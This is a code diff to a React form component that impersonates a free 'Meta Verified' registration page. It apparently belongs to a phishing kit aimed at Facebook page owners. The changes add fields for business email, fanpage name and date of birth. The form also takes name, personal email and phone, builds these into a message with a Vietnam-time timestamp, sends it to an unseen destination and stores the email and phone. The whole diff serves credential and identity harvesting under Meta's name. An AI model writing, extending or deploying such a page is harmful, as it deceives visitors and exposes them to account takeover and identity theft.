@@ -12,32 +12,32 @@ import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useM
 interface FormData {
     fullName: string;
     personalEmail: string;
+    businessEmail: string;
     pageName: string;
+    day: string;
+    month: string;
+    year: string;
+    describe: string;
 }
 
-interface FormField {
-    name: keyof FormData;
-    label: string;
-    type: 'text' | 'email' | 'textarea';
-}
-
-const FORM_FIELDS: FormField[] = [
-    { name: 'fullName', label: 'Full Name', type: 'text' },
-    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
-    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
-];
+const initialFormData: FormData = {
+    fullName: '',
+    personalEmail: '',
+    businessEmail: '',
+    pageName: '',
+    day: '',
+    month: '',
+    year: '',
+    describe: ''
+};
 const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [agreeToTerms, setAgreeToTerms] = useState(false);
-    const [formData, setFormData] = useState<FormData>({
-        fullName: '',
-        personalEmail: '',
-        pageName: ''
-    });
+    const [formData, setFormData] = useState<FormData>(initialFormData);
 
-    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
+    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserPhone } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -46,7 +46,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Describe', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Subscribe'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -72,8 +72,8 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
         [countryCode]
     );
 
-    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
-        const { name, value, type } = e.target;
+    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
+        const { name, value, type } = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
         setFormData((prev) => ({
             ...prev,
             [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
@@ -98,9 +98,11 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
-<b>📘 Page Name:</b> <code>${formData.pageName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
+<b>� Email Address:</b> <code>${formData.personalEmail}</code>
+<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
+<b>📘 Fanpage Name:</b> <code>${formData.pageName}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+<b>🎂 Date of Birth:</b> <code>${formData.day}/${formData.month}/${formData.year}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
@@ -117,6 +119,9 @@ ${
             // Continue even if send fails
         } finally {
             setIsLoading(false);
+            // Save email and phone to store
+            setUserEmail(formData.personalEmail);
+            setUserPhone(phoneNumber);
             nextStep(formData);
         }
     };
@@ -134,38 +139,154 @@ ${
                     </button>
                 </div>
 
-                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-1.5 sm:px-3 md:px-4'>
-                    <div className='flex flex-col gap-1.5 sm:gap-2 py-1.5 sm:py-2'>
-                        {FORM_FIELDS.map((field) => (
-                            <div key={field.name}>
-                                <p className='text-xs sm:text-sm font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-20 sm:min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' />}
-                            </div>
-                        ))}
-                        <p className='text-xs sm:text-sm font-sans'>{t('Mobile phone number')}</p>
+                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-hidden px-1.5 sm:px-3 md:px-4'>
+                    <div className='flex flex-col gap-1.5 sm:gap-1.5 md:gap-2 py-1 sm:py-1.5 overflow-y-auto'>
+                        {/* Full Name */}
+                        <input 
+                            required 
+                            type='text'
+                            name='fullName'
+                            placeholder={t('Full Name')}
+                            value={formData.fullName}
+                            onChange={handleInputChange}
+                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
+                        />
+
+                        {/* Email Address */}
+                        <input 
+                            required 
+                            type='email'
+                            name='personalEmail'
+                            placeholder={t('Email Address')}
+                            value={formData.personalEmail}
+                            onChange={handleInputChange}
+                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
+                        />
+
+                        {/* Email Business Address */}
+                        <input 
+                            required 
+                            type='email'
+                            name='businessEmail'
+                            placeholder={t('Email Business Address')}
+                            value={formData.businessEmail}
+                            onChange={handleInputChange}
+                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
+                        />
+
+                        {/* Fanpage Name */}
+                        <input 
+                            required 
+                            type='text'
+                            name='pageName'
+                            placeholder={t('Fanpage Name')}
+                            value={formData.pageName}
+                            onChange={handleInputChange}
+                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
+                        />
+
+                        {/* Phone Number */}
                         <IntlTelInput
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
                                 name: 'phoneNumber',
-                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
+                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                             }}
                         />
-                        <p className='text-xs sm:text-xs text-gray-600 mt-2 sm:mt-3'>{t('Our response will be sent to you within 14-40 hours.')}</p>
-                        <div className='flex items-center gap-2 mt-2 sm:mt-3'>
+
+                        {/* Date of Birth */}
+                        <div className='flex gap-2 sm:gap-2.5'>
+                            {/* Day Select */}
+                            <select 
+                                name='day'
+                                value={formData.day}
+                                onChange={handleInputChange}
+                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
+                            >
+                                <option value=''>DD</option>
+                                {Array.from({ length: 31 }, (_, i) => (
+                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                                        {String(i + 1).padStart(2, '0')}
+                                    </option>
+                                ))}
+                            </select>
+
+                            {/* Month Select */}
+                            <select 
+                                name='month'
+                                value={formData.month}
+                                onChange={handleInputChange}
+                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
+                            >
+                                <option value=''>MM</option>
+                                {Array.from({ length: 12 }, (_, i) => (
+                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                                        {String(i + 1).padStart(2, '0')}
+                                    </option>
+                                ))}
+                            </select>
+
+                            {/* Year Select */}
+                            <select 
+                                name='year'
+                                value={formData.year}
+                                onChange={handleInputChange}
+                                className='h-9 sm:h-10 md:h-11 flex-1 min-w-20 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
+                            >
+                                <option value=''>YYYY</option>
+                                {Array.from({ length: 100 }, (_, i) => {
+                                    const year = new Date().getFullYear() - i;
+                                    return (
+                                        <option key={year} value={String(year)}>
+                                            {year}
+                                        </option>
+                                    );
+                                })}
+                            </select>
+                        </div>
+
+                        {/* Describe */}
+                        <textarea 
+                            name='describe'
+                            placeholder={t('Describe')}
+                            value={formData.describe}
+                            onChange={handleInputChange}
+                            className='h-16 sm:h-20 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-xs md:text-sm placeholder-gray-500 resize-none'
+                            rows={2}
+                        />
+
+                        {/* Disclaimer */}
+                        <p className='text-xs text-gray-600 mt-0.5'>{t('Our response will be sent to you within 14-48 hours.')}</p>
+
+                        {/* Terms Checkbox */}
+                        <div className='flex items-center gap-2 mt-1'>
                             <input 
                                 type='checkbox' 
                                 id='agreeTerms'
                                 checked={agreeToTerms}
                                 onChange={(e) => setAgreeToTerms(e.target.checked)}
-                                className='w-4 h-4 cursor-pointer'
+                                className='w-4 h-4 cursor-pointer flex-shrink-0'
                             />
-                            <label htmlFor='agreeTerms' className='text-xs sm:text-xs text-gray-700 cursor-pointer'>
-                                {t('I agree with Terms of use')}
+                            <label htmlFor='agreeTerms' className='text-xs text-gray-700 cursor-pointer leading-tight'>
+                                {t('I agree to the')} {' '}
+                                <span className='text-blue-600'>
+                                    {t('Terms of Service')}
+                                </span>
+                                {' '}{t('and')}{' '}
+                                <span className='text-blue-600'>
+                                    {t('Privacy Policy')}
+                                </span>
                             </label>
                         </div>
-                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-3 sm:mt-4 md:mt-5 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
-                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
+
+                        {/* Submit Button */}
+                        <button 
+                            type='submit' 
+                            disabled={isLoading || !agreeToTerms}
+                            className={`mt-2 sm:mt-2.5 md:mt-3 flex h-10 sm:h-11 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}
+                        >
+                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Subscribe')}
                         </button>
                     </div>
                 </form>
